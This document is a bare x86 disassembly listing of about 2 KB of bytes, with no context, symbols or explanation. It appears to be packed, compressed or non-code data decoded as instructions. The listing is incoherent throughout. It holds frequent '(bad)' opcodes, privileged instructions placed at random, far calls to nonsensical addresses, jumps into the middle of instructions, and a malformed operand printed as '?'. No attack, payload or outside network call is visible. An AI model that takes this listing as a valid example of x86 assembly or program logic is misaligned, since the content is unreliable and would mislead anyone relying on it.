  4323fe:	data16 or al,BYTE PTR [ebp+0x45]
  432402:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432409:	rol    BYTE PTR [ebp+0x45],1
  43240c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432412:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432418:	push   ebx
  432419:	add    BYTE PTR [ebx+0x0],dl
  43241c:	push   ecx
  43241d:	jge    0x432452
  43241f:	add    BYTE PTR [esi+0x4],dl
  432422:	jne    0x432489
  432424:	mov    edx,0x457200
  432429:	jmp    0x4323ed
  43242b:	xor    edi,DWORD PTR [ebx]
  43242d:	pop    edi
  43242e:	cvtdq2ps xmm7,xmm0
  432431:	ret    0x0
  432434:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43243a:	xor    ecx,DWORD PTR [edi]
  43243c:	add    eax,DWORD PTR [ecx+0x3b]
  43243f:	push   ebx
  432440:	rdpmc  
  432442:	out    0x8d,al
  432444:	add    BYTE PTR [eax],cl
  432446:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43244c:	ret    0x450c
  43244f:	sbb    al,0x8b
  432451:	cmp    eax,esi
  432453:	or     cl,al
  432455:	or     al,0xc2
  432457:	pop    eax
  432458:	inc    ebp
  432459:	add    ecx,DWORD PTR [edi]
  43245b:	add    esi,DWORD PTR [ebp+0x39]
  43245e:	invd   
  432460:	jge    0x43246c
  432462:	mov    eax,0x478ac0
  432467:	cli    
  432468:	xor    esp,ecx
  43246a:	mov    ebx,0x5b8ac0
  43246f:	ret    0x33
  432472:	mov    eax,0x833b8b
  432477:	sub    BYTE PTR [ebx],al
  432479:	inc    ebp
  43247a:	xor    ax,0x9cf8
  43247e:	inc    bh
  432480:	mov    esp,esp
  432482:	hlt    
  432483:	test   DWORD PTR [ebp-0x8],esi
  432486:	mov    eax,DWORD PTR [ebp-0x14]
  432489:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43248f:	dec    edi
  432490:	or     BYTE PTR [eax],al
  432492:	jne    0x43241d
  432494:	mov    esi,esp
  432496:	call   0x77a9b05b
  43249b:	inc    ebp
  43249c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  4324a2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324a8:	add    BYTE PTR [esi+0x7d],ah
  4324ab:	inc    ebp
  4324ac:	mov    bx,WORD PTR [ebp+0x8]
  4324b0:	add    DWORD PTR [ebp+0x53],0x30c008b
  4324b7:	inc    ebp
  4324b8:	mov    bx,di
  4324bb:	lock test BYTE PTR [ecx+0x7000801],bh
  4324c2:	jge    0x432485
  4324c4:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  4324ca:	cli    
  4324cb:	xor    bl,bh
  4324cd:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4324d3:	test   BYTE PTR [eax],cl
  4324d5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4324dc:	cmp    ebp,eax
  4324de:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4324e5:	test   BYTE PTR [ebp+0x1],bh
  4324e8:	mov    ebx,0x458a00
  4324ed:	xor    esi,DWORD PTR [ebx]
  4324ef:	add    esp,DWORD PTR [esi-0x77]
  4324f2:	pop    ebp
  4324f3:	loopne 0x43255b
  4324f5:	inc    ebp
  4324f6:	clc    
  4324f7:	xor    edi,DWORD PTR [ebx]
  4324f9:	add    esi,DWORD PTR [edx-0x77]
  4324fc:	data16 fdivr QWORD PTR [ebp-0x49]
  432500:	mov    ebx,0xb78afc
  432505:	hlt    
  432506:	xor    edi,DWORD PTR [edx]
  432508:	data16 add BYTE PTR [ebp+0x66],bl
  43250c:	data16 lock clc 
  43250f:	cmp    bh,BYTE PTR [ebx]
  432511:	add    BYTE PTR [edi+0x66],dh
  432514:	psubq  mm7,QWORD PTR [ebp+0x0]
  432518:	ltr    WORD PTR [ebp+0x66]
  43251c:	add    esi,eax
  43251e:	add    di,WORD PTR [ebp+0x2b]
  432522:	data16 data16 jge 0x4325a3
  432526:	mov    ebx,0xe08a8b
  43252b:	jge    0x432560
  43252d:	data16 data16 xor al,0x5d
  432531:	data16 data16 jne 0x43252d
  432535:	mov    edi,DWORD PTR [ebx]
  432537:	fdiv   QWORD PTR [edx+0x7d]
  43253a:	data16 data16 jge 0x432572
  43253e:	mov    ebx,0x758a66
  432543:	mov    esi,0x667233
  432548:	pop    ebp
  432549:	or     BYTE PTR [esi+0x0],ah
  43254c:	clc    
  43254d:	mov    edi,DWORD PTR [ebx]
  43254f:	lock ja 0x4324dd
  432552:	(bad)  
  432554:	jge    0x43254d
  432556:	invd   
  432558:	pop    ebp
  432559:	add    BYTE PTR [ebx],al
  43255b:	(bad)  
  43255c:	cmp    di,WORD PTR [ebp+0xf]
  432560:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432564:	mov    bx,WORD PTR [ebp-0x10]
  432568:	pop    bp
  43256a:	fbstp  TBYTE PTR [ebx]
  43256c:	test   DWORD PTR [ebx],eax
  43256e:	add    BYTE PTR [ebx],bh
  432570:	add    BYTE PTR [esi+0x7d],ah
  432573:	jge    0x432500
  432575:	data16 in al,dx
  432577:	pop    ebp
  432578:	stc    
  432579:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432580:	mov    edi,ebx
  432582:	in     al,dx
  432583:	test   BYTE PTR [ebp+0x0],bh
  432586:	mov    eax,DWORD PTR [eax]
  432588:	call   0xbd401f18
  43258d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432593:	sti    
  432594:	call   0x8b4ba324
  432599:	add    ebp,esp
  43259b:	mov    bx,di
  43259e:	jnp    0x4325c6
  4325a0:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  4325a6:	mov    eax,DWORD PTR [eax]
  4325a8:	call   0x7c3eb113
  4325ad:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325b3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325b8:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  4325c2:	fisttp WORD PTR [ecx-0x7401f77b]
  4325c8:	(bad)  
  4325c9:	cld    
  4325ca:	jne    0x432606
  4325cc:	xor    eax,DWORD PTR [eax]
  4325ce:	mov    esp,DWORD PTR [esi-0x10]
  4325d1:	sti    
  4325d2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4325d9:	data16 adc bl,bh
  4325dc:	push   ebp
  4325dd:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  4325e4:	mov    WORD PTR [eax],es
  4325e6:	call   0xe48b:0x89fb3266
  4325ed:	or     al,0x55
  4325ef:	add    ecx,DWORD PTR [ebx-0x7420139a]
  4325f5:	push   cs
  4325f6:	push   esi
  4325f7:	mov    bh,0xc8
  4325f9:	or     al,0x2b
  4325fb:	mov    bh,0xba
  4325fd:	hlt    
  4325fe:	mov    bh,bl
  432600:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432606:	dec    edi
  432607:	or     al,0x0
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	or     BYTE PTR [ebp+0x3b],dh
  43260e:	mov    ecx,DWORD PTR [edi]
  432610:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432616:	xor    al,0xd8
  432618:	pop    bp
  43261a:	lock xor esi,DWORD PTR [ebx]
  43261d:	lea    esp,[esi+0x1f]
  432620:	icebp  
  432621:	jb     0x432627
  432623:	add    al,al
  432625:	jge    0x432633
  432627:	mov    eax,eax
  432629:	fsubr  st,st(3)
  43262b:	pop    ebp
  43262c:	mov    esi,DWORD PTR [ebx]
  43262e:	in     al,0x8d
  432630:	rcr    DWORD PTR [edi],0xc2
  432633:	jb     0x432693
  432635:	add    cl,cl
  432637:	jge    0x432645
  432639:	mov    edx,DWORD PTR [ebp-0x20]
  43263c:	in     al,dx
  43263d:	pop    ebp
  43263e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432643:	cmp    di,WORD PTR [ebp+0x0]
  432647:	mov    ebp,DWORD PTR [ebx]
  432649:	fdivr  QWORD PTR [esi+0x668a5d]
  43264f:	cmp    al,0x33
  432651:	mov    si,0x4f7d
  432655:	mov    eax,DWORD PTR [eax]
  432657:	lock inc ebp
  432659:	mov    esi,DWORD PTR [esi]
  43265b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  432662:	clc    
  432663:	(bad)  
  432664:	cmp    edi,DWORD PTR [ebx]
  432666:	je     0x432677
  432668:	push   ebx
  432669:	loopne 0x43267a
  43266b:	dec    ecx
  43266d:	mov    esp,DWORD PTR [esi-0x1c]
  432670:	int    0xf1
  432672:	mov    esi,0x703084d
  432677:	pcmpgtd mm6,mm1
  43267a:	add    BYTE PTR [ebp+0x66],dh
  43267d:	jmp    0x43264a
  43267f:	mov    eax,DWORD PTR [ebx]
  432681:	lock push ebp
  432683:	ror    DWORD PTR [ebp-0x2972feb3],1
  432689:	or     bh,dl
  43268b:	jb     0x43268b
  43268d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432693:	loopne 0x432695
  432695:	jne    0x432697
  432697:	data16 add BYTE PTR [esi+eiz*2],dh
  43269b:	mov    ecx,ebx
  43269d:	data16 cmp dh,cl
  4326a0:	add    BYTE PTR [edx],bh
  4326a2:	data16 add bl,cl
  4326a5:	data16 cmp dh,dl
  4326a8:	add    BYTE PTR [edx],bh
  4326aa:	data16 add bl,cl
  4326ad:	enterw 0x4df1,0x19
  4326b2:	pop    edi
  4326b3:	jne    0x432636
  4326b5:	mov    esi,DWORD PTR [esi]
  4326b7:	call   0x77b7b258
  4326bc:	xor    ebp,DWORD PTR [ebx]
  4326be:	lea    esp,[esi+0x48]
  4326c1:	repnz in eax,0x3b
  4326c4:	add    BYTE PTR [ebp-0x37],dh
  4326c7:	xor    edx,DWORD PTR [ebp-0x15]
  4326ca:	in     al,dx
  4326cb:	xor    edx,DWORD PTR [esi+0x40]
  4326ce:	mov    DWORD PTR [edi],0x338545fc
  4326d4:	clc    
  4326d5:	add    esi,DWORD PTR ds:0xe85b9c5f
  4326db:	ret    0xff
  4326de:	dec    DWORD PTR [ebx-0x74f8ae08]
  4326e4:	cmp    DWORD PTR [esi+0x45],edx
  4326e7:	add    BYTE PTR [eax+eax*1+0x61],bh
  4326eb:	data16 (bad) 
  4326ed:	into   
  4326ee:	data16 cmp cl,ch
  4326f1:	add    BYTE PTR [ecx+0x7ce0866],bh
  4326f7:	cmp    ah,BYTE PTR [esi+0x0]
  4326fa:	add    bh,al
  4326fc:	add    ah,bh
  4326fe:	add    BYTE PTR [ebp+0x35c3f866],al
  432704:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43270b:	pop    ebp
  43270c:	adc    al,0x57
  43270e:	add    BYTE PTR [edi-0x723c409a],dh
  432714:	add    edi,edi
  432716:	jne    0x43276b
  432718:	lea    edx,[ecx+0x1]
  43271b:	mov    ebx,0xd64ff1
  432720:	sar    DWORD PTR [ebx],1
  432722:	test   BYTE PTR [ebp+0x34],dh
  432725:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432729:	push   edi
  43272a:	xor    BYTE PTR [ebx],0x39
  43272d:	mov    esi,ebx
  43272f:	xor    eax,DWORD PTR [eax-0x3c73839a]
  432735:	xor    al,0x45
  432737:	fs pop ebx
  432739:	mov    ebx,0x9c3b36
  43273e:	je     0x43276b
  432740:	xor    edi,DWORD PTR [ebx+0x668a33]
  432746:	mov    WORD PTR [ebx],?
  432748:	xor    al,0xbb
  43274a:	fs dec edi
  43274c:	mov    eax,DWORD PTR [eax]
  43274e:	pop    edi
  43274f:	cmp    ecx,ecx
  432751:	jne    0x4327a8
  432753:	mov    ebp,esp
  432755:	cld    
  432756:	push   esi
  432757:	pop    ebx
  432758:	inc    ebp
  432759:	stc    
  43275a:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  432762:	clc    
  432763:	test   dl,dl
  432765:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  43276a:	or     bl,al
  43276c:	add    BYTE PTR [ebx+0x57665100],cl
  432772:	retf   0x3a45
  432775:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  43277d:	clc    
  43277e:	add    BYTE PTR [ebx+0x66],bl
  432781:	dec    edx
  432783:	mov    edx,DWORD PTR [edi-0x76]
  432786:	push   edi
  432787:	add    al,0xb7
  432789:	xor    al,0xba
  43278b:	cmp    al,0x8d
  43278d:	je     0x43278e
  43278f:	mov    edx,DWORD PTR [ebx-0x46]
  432792:	push   ecx
  432793:	lea    edi,[ebx+0x534fff]
  432799:	push   ecx
  43279a:	cmp    edx,DWORD PTR [ebx+0x75]
  43279d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327a3:	add    BYTE PTR [ebx],dh
  4327a5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327ab:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  4327b2:	mov    ebx,0x3b3b00
  4327b7:	jne    0x4327e4
  4327b9:	mov    DWORD PTR [ebx+0x728afc],edi
  4327bf:	xor    esi,DWORD PTR [ebx]
  4327c1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4327c7:	push   edi
  4327c8:	cmp    esp,ebp
  4327ca:	jne    0x4327cc
  4327cc:	sbb    DWORD PTR [eax],0x8085c3fc
  4327d2:	clc    
  4327d3:	inc    ebp
  4327d4:	pop    ebx
  4327d5:	sti    
  4327d6:	add    eax,0xeb8bc075
  4327db:	cld    
  4327dc:	xor    edi,DWORD PTR ds:0xf8c3855e
  4327e2:	mov    ecx,DWORD PTR [ecx+edx*2]
  4327e5:	rol    DWORD PTR [ebp-0x37],0xf
  4327e9:	mov    DWORD PTR [eax],ecx
  4327eb:	inc    edi
  4327ec:	(bad)  
  4327ed:	in     eax,0x0
  4327ef:	add    bh,bh
  4327f1:	(bad)  
  4327f2:	mov    esi,0xc38a5e
  4327f7:	mov    esi,DWORD PTR [ebx]
  4327f9:	push   ecx
  4327fa:	mov    edi,0xfc4fc7
  4327ff:	test   DWORD PTR [ebp-0x8],edx
  432802:	xor    ax,0x9cc7
  432806:	sub    ebp,eax
  432808:	inc    ebp
  432809:	(bad)  
  43280a:	sub    edi,edi
  43280c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432812:	inc    ebp
  432813:	add    BYTE PTR [esi+0x2b],ah
  432816:	or     bh,BYTE PTR [edx+0xf8ac2]
  43281c:	cmp    al,0x33
  43281e:	mov    edi,DWORD PTR [edx+0x4f81]
  432824:	(bad)  
  432825:	cmp    esi,DWORD PTR [ebx]
  432827:	je     0x4327e1
  432829:	push   ebx
  43282a:	dec    edi
  43282b:	str    ecx
  43282e:	cmp    esp,DWORD PTR [esi+0x75]
  432831:	int    0x33
  432833:	mov    edi,0x789085f
  432838:	mov    edx,DWORD PTR [esp+edi*8]
  43283b:	add    cl,cl
  43283d:	data16 add al,0xcb
  432840:	push   ebp
  432841:	add    ebp,esp
  432843:	jne    0x432831
  432845:	(bad)  
  432846:	mov    DWORD PTR [ecx],0xd685f7ec
  43284c:	clc    
  43284d:	xlat   BYTE PTR ds:[ebx]
  43284e:	inc    ebp
  43284f:	mov    esi,DWORD PTR [eax+edx*2]
  432852:	pushf  
  432853:	in     eax,0x8b
  432855:	add    ah,ch
  432857:	add    BYTE PTR [ebx+0x0],dl
  43285a:	push   ecx
  43285b:	add    ax,0x72cb
  43285f:	cmp    al,BYTE PTR [eax]
  432861:	add    BYTE PTR [ebp+0x66],al
  432864:	(bad)  
  432865:	retf   
  432866:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43286d:	retf   
  43286e:	cmp    eax,ecx
  432870:	pushf  
  432871:	jge    0x43283a
  432873:	ss cld 
  432875:	pushf  
  432876:	test   DWORD PTR [edi-0x8],ebx
  432879:	je     0x4328c0
  43287b:	xor    esi,DWORD PTR ds:0x7020840
  432881:	ror    BYTE PTR [ebp-0x37],0x8d
  432885:	push   ebp
  432886:	add    esp,ebp
  432888:	jb     0x432815
  43288a:	add    BYTE PTR [eax],cl
  43288c:	dec    ebp
  43288d:	mov    bh,0x81
  43288f:	push   esi
  432890:	push   ebx
  432891:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432898:	xor    al,BYTE PTR [eax]
  43289a:	mov    edx,DWORD PTR [edi+0x10]
  43289d:	(bad)  
  43289e:	scas   eax,DWORD PTR es:[edi]
  43289f:	cmp    bh,BYTE PTR [ebx]
  4328a1:	add    BYTE PTR [edi],cl
  4328a3:	mov    ebp,ebp
  4328a5:	cld    
  4328a6:	add    BYTE PTR [ebx],bh
  4328a8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328ac:	dec    ebp
  4328ad:	or     BYTE PTR [ebx],ch
  4328af:	ret    0x458b
  4328b2:	lock jmp 0x4328a6
  4328b5:	mov    ecx,DWORD PTR [eax]
  4328b7:	or     BYTE PTR [edi],al
  4328b9:	mov    ecx,eax
  4328bb:	xor    DWORD PTR [edx+0x2],0x0
  4328bf:	mov    bh,0xc1
  4328c1:	adc    BYTE PTR [eax],dh
  4328c3:	iret   
  4328c4:	inc    ebp
  4328c5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4328cb:	inc    BYTE PTR [ebx]
  4328cd:	cmp    bh,al
  4328cf:	add    BYTE PTR [ecx],dl
  4328d1:	data16 adc al,bh
  4328d4:	dec    ecx
  4328d5:	fisttp WORD PTR [ecx+0x456604c0]
  4328db:	add    dh,BYTE PTR ds:0x75e0845
  4328e1:	ret    0x4d
  4328e4:	lea    ecx,[ebx+0x18728301]
  4328ea:	add    BYTE PTR [ebp+0x45],al
  4328ed:	xor    eax,0xc7009ce9
  4328f2:	add    al,ch
  4328f4:	inc    ebp
  4328f5:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4328fb:	xor    eax,0x781084d
  432900:	push   ebx
  432901:	call   0xf89a:0x89813251
  432908:	xor    al,BYTE PTR [ebp+0x3b]
  43290b:	cmp    eax,0xc78b9c76
  432910:	or     ah,dh
  432912:	inc    ebp
  432913:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432919:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43291f:	in     al,dx
  432920:	hlt    
  432921:	push   ebx
  432922:	push   ebx
  432923:	push   ecx
  432924:	push   ecx
  432925:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43292b:	call   0xe889:0x8b32329a
  432932:	clc    
  432933:	icebp  
  432934:	pop    ebx
  432935:	or     BYTE PTR [ebp+0x7],al
  432938:	mov    eax,ecx
  43293a:	clc    
  43293b:	jb     0x4328fe
  43293d:	add    BYTE PTR [ebp+0x55],cl
  432940:	or     DWORD PTR [edi],0xc251d153
  432946:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  432950:	mov    edi,eax
  432952:	or     cl,al
  432954:	inc    ebp
  432955:	dec    ebp
  432956:	mov    eax,DWORD PTR [ecx+0x514d530c]
  43295c:	or     WORD PTR [ecx],0x899a
  432961:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  432967:	mov    edx,DWORD PTR [ecx+0x8]
  43296a:	mov    eax,DWORD PTR [ebp-0x8]
  43296d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  432974:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43297a:	inc    ebp
  43297b:	dec    eax
  43297c:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432982:	add    edx,DWORD PTR [ecx-0x8]
  432985:	mov    ecx,DWORD PTR [ecx]
  432987:	clc    
  432988:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43298f:	mov    ecx,ebp
  432991:	clc    
  432992:	(bad)  
  432993:	popf   
  432994:	inc    DWORD PTR [eax]
  432996:	ret    0x8b
  432999:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43299f:	mov    edi,esp
  4329a1:	hlt    
  4329a2:	test   ecx,esi
  4329a4:	clc    
  4329a5:	or     BYTE PTR [ebp+0x7],al
  4329a8:	xor    al,0xc1
  4329aa:	pushf  
  4329ab:	jb     0x4329e0
  4329ad:	add    BYTE PTR [eax-0x3f],al
  4329b0:	inc    eax
  4329b1:	daa    
  4329b2:	inc    ebp
  4329b3:	inc    ebp
  4329b4:	xor    eax,0x7f80803
  4329b9:	dec    ebp
  4329ba:	call   0xc09:0x39f83203
  4329c1:	or     BYTE PTR [edx],al
  4329c3:	inc    ebp
  4329c4:	sub    al,0x35
  4329c6:	inc    ebp
  4329c7:	or     BYTE PTR ds:0x74d0807,dh
  4329cd:	lea    ebx,[edx-0x748dcdff]
  4329d3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4329da:	mov    edx,DWORD PTR [eax]
  4329dc:	cld    
  4329dd:	dec    ebp
  4329de:	push   ebx
  4329df:	sub    edx,DWORD PTR [ecx-0x75]
  4329e2:	add    eax,0xf172fc
  4329e7:	or     BYTE PTR [ebp+0x7],cl
  4329ea:	add    eax,ecx
  4329ec:	or     al,0x72
  4329ee:	add    DWORD PTR [eax],eax
  4329f0:	mov    ebx,0x29c2c1
  4329f5:	inc    ebp
  4329f6:	mov    eax,DWORD PTR [ebx]
  4329f8:	cmp    eax,0x3004d1c
  4329fe:	xbegin 0x66c8b5f8
  432a04:	clc    
  432a05:	or     BYTE PTR [ebp+0x45],al
  432a08:	xor    al,0x35
  432a0a:	pushf  
  432a0b:	or     BYTE PTR [ebx+0x454d1007],cl
  432a11:	lea    eax,[ebp+0x33727501]
  432a17:	add    cl,ch
  432a19:	inc    ebp
  432a1a:	add    bl,ch
  432a1c:	add    BYTE PTR [ebx+0x45850845],cl
  432a22:	je     0x4329af
  432a24:	push   ebx
  432a25:	or     al,0x85
  432a27:	dec    ebp
  432a28:	std    
  432a29:	mov    bh,bh
  432a2b:	mov    BYTE PTR [ebp-0x75],al
  432a2e:	mov    edi,eax
  432a30:	or     al,0x89
  432a32:	inc    ebp
  432a33:	clc    
  432a34:	mov    esp,esp
  432a36:	hlt    
  432a37:	call   DWORD PTR [edi-0x37]
  432a3a:	push   ebx
  432a3b:	or     al,0x51
  432a3d:	push   ebp
  432a3e:	xor    ebp,esp
  432a40:	mov    esi,0x457251
  432a45:	xor    eax,0xc7459cc6
  432a4a:	mov    edi,eax
  432a4c:	or     al,0x85
  432a4e:	add    al,bh
  432a50:	inc    eax
  432a52:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a56:	or     ah,bh
  432a58:	inc    eax
  432a59:	push   ebx
  432a5a:	jmp    0x432aad
  432a5c:	mov    eax,DWORD PTR ds:0xe8720c
  432a62:	mov    DWORD PTR [ebp-0x8],eax
  432a65:	jne    0x432aac
  432a67:	jmp    0x4329f4
  432a69:	mov    ebp,DWORD PTR [eax]
  432a6b:	clc    
  432a6c:	retf   0xff53
  432a6f:	push   ecx
  432a70:	mov    DWORD PTR ds:0x757210,eax
  432a76:	mov    ecx,DWORD PTR [ebp-0x4]
  432a79:	sub    esp,DWORD PTR [ebx-0x77]
  432a7c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a83:	or     ah,bh
  432a85:	pop    es
  432a86:	ds call 0x8f0:0x8b8b32ff
  432a8e:	(bad)  
  432a8f:	dec    ebp
  432a90:	(bad)  
  432a91:	mov    bh,bh
  432a93:	jmp    0x432a81
  432a95:	leave  
  432a96:	jne    0x432aa0
  432a98:	call   0x3023f2
  432a9d:	in     al,dx
  432a9e:	dec    ebp
  432a9f:	add    dh,BYTE PTR [ebx]
  432aa1:	add    BYTE PTR [ebx],al
  432aa3:	inc    ebp
  432aa4:	cmp    esi,DWORD PTR ds:0xc78b9c74
  432aaa:	or     al,0xf0
  432aac:	add    BYTE PTR [ebp+0x458bf845],al
  432ab2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432ab8:	adc    al,0x7
  432aba:	enter  0x9fc0,0xa5
  432abe:	rol    BYTE PTR [eax],0x5e
  432ac1:	mov    ecx,ecx
  432ac3:	or     al,0xc
  432ac5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432acc:	jmp    0x432acd
  432ace:	push   ebp
  432acf:	mov    esp,ebp
  432ad1:	cld    
  432ad2:	inc    ebp
  432ad3:	inc    ebp
  432ad4:	or     DWORD PTR [ecx+0x457dec10],0x0
  432adb:	push   esi
  432adc:	push   esi
  432add:	mov    edi,0x7af080f
  432ae2:	add    bh,al
  432ae4:	test   DWORD PTR [edx+0x3a7320f],ebx
  432aea:	add    BYTE PTR [ecx+0x4540100f],cl
  432af0:	mov    ebp,eax
  432af2:	mov    ebp,edi
  432af4:	lock call edx
  432af7:	fcom   DWORD PTR [ebp+0x45]
  432afa:	mov    eax,0x148a8b
  432aff:	push   ecx
  432b00:	enter  0xc145,0x83
  432b04:	cmp    ecx,DWORD PTR [eax]
  432b06:	add    BYTE PTR [ebp+0x4d],al
  432b09:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b0f:	call   0xffa3267e
  432b14:	cmp    eax,DWORD PTR [ebp-0xc]
  432b17:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b1b:	push   ebp
  432b1c:	(bad)
  432b1f:	std    
  432b20:	lock push DWORD PTR [edi+0x5d08fcdb]
  432b27:	inc    ebp
  432b28:	(bad)  
  432b29:	call   0xff7d27b9
  432b2e:	add    al,BYTE PTR [ebp+0x37]
  432b31:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  432b37:	jne    0x432b39
  432b39:	(bad)  
  432b3a:	cmp    edi,esp
  432b3c:	jne    0x432b6f
  432b3e:	mov    edi,edi
  432b40:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b46:	pop    ds
  432b47:	into   
  432b48:	je     0x432b0b
  432b4a:	mov    ebx,DWORD PTR [esi]
  432b4c:	or     BYTE PTR [ebp-0x49],al
  432b4f:	mov    esp,DWORD PTR [esi-0x77]
  432b52:	mov    esi,0x451f0c
  432b57:	mov    eax,DWORD PTR [eax]
  432b59:	or     al,0x66
  432b5b:	sar    bl,0x3b
  432b5e:	xor    esi,DWORD PTR [ebp+0x66]
  432b61:	xor    ecx,edi
  432b63:	pop    edi
  432b64:	adc    bl,BYTE PTR [ebx+0x7c]
  432b67:	ret    0xff
  432b6a:	cld    
  432b6b:	inc    ebp
  432b6c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432b72:	cld    
  432b73:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432b7a:	push   0xffffff83
  432b7c:	pop    edi
  432b7d:	or     BYTE PTR [ebp+0x53],dh
  432b80:	xorps  xmm1,xmm2
  432b83:	test   BYTE PTR [eax+eax*1],bh
  432b86:	add    BYTE PTR [eax],al
  432b88:	adc    eax,eax
  432b8a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432b92:	jmp    DWORD PTR [eax]
  432b94:	ror    al,0x5e
  432b97:	inc    ebp
  432b98:	leave  
  432b99:	xor    ecx,DWORD PTR [eax]
  432b9b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432ba1:	add    ch,al
  432ba3:	xor    edi,edi
  432ba5:	xor    DWORD PTR [ebx],0x66003300
  432bab:	mov    DWORD PTR [ebp-0xc],ecx
  432bae:	pcmpgtw mm0,mm0
  432bb1:	add    dl,ah
  432bb3:	leave  
  432bb4:	mov    edi,DWORD PTR [esi-0x7d]
  432bb7:	push   ax
  432bb9:	dec    ebp
  432bba:	mov    esi,DWORD PTR [ebx-0x75]
  432bbd:	lea    ebp,[eax-0x7c010000]
  432bc3:	xor    eax,DWORD PTR [eax]
  432bc5:	sysret 
  432bc7:	dec    ebp
  432bc8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432bcf:	push   WORD PTR [ecx+0x8]
  432bd3:	jne    0x432b96
  432bd5:	ud0    ecx,DWORD PTR [ecx]
  432bd8:	mov    edi,DWORD PTR [edx]
  432bda:	lods   al,BYTE PTR ds:[esi]
  432bdb:	add    BYTE PTR [eax],al
  432bdd:	data16 (bad) 
  432bdf:	iret   
  432be0:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432be7:	cli    
  432be8:	inc    ebp
  432be9:	cmp    al,0x8d
  432beb:	add    BYTE PTR [esi+0x2d],ah
  432bee:	inc    ebp
  432bef:	pop    ebp
  432bf0:	lea    ecx,[edi]
  432bf2:	mov    dl,bh
  432bf4:	add    BYTE PTR [edi],cl
  432bf6:	mov    DWORD PTR [eax+eax*8],edi
  432bf9:	mov    ebx,0x3b87
  432bfe:	add    BYTE PTR [ebx],ch
  432c00:	inc    ebp
  432c01:	data16 (bad) 
  432c03:	clc    
  432c04:	int3   
  432c05:	cmp    eax,DWORD PTR [eax]
  432c07:	je     0x432b92
  432c09:	push   0xffffffc8
  432c0b:	pop    edi
  432c0c:	xchg   DWORD PTR [ebp+0x0],eax
  432c0f:	data16 add BYTE PTR [ebp+0x45],cl
  432c13:	lea    cx,[ebp+0x10]
  432c17:	jb     0x432c19
  432c19:	jmp    0x432ba4
  432c1b:	call   eax
  432c1d:	clc    
  432c1e:	xchg   DWORD PTR [edi+0x1],edi
  432c21:	mov    eax,DWORD PTR [eax]
  432c23:	or     BYTE PTR [ebp-0x49],al
  432c26:	lea    eax,[eax+0x74003154]
  432c2c:	push   edi
  432c2d:	inc    edx
  432c2e:	jge    0x432c2f
  432c30:	mov    DWORD PTR [edi],ecx
  432c32:	fdiv   DWORD PTR [edi-0x6]
  432c35:	inc    DWORD PTR [eax]
  432c37:	xor    edx,DWORD PTR [eax+0x5f]
  432c3a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c3d:	ret    0x0
  432c40:	xor    BYTE PTR [ebp-0x51],cl
  432c43:	cmp    edi,0xf0ff8900
  432c49:	data16 ror al,0x84
  432c4d:	rol    BYTE PTR [eax],0x3b
